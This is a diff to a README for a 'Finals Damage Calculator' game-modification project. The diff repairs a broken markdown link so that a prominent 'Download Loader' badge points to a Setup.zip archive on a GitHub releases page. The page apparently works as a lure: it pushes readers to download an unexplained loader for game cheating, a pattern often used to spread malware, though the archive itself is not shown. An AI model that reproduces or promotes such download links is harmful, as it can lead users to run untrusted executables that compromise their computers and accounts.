@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for The Finals Damage Calculator
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `The-Finals-Damage-Calculator` · Updated: 2026-10-05
 
 **Tags:** `the-finals` `damage-calculator` `fps` `weapons` `multiplayer`
+
 
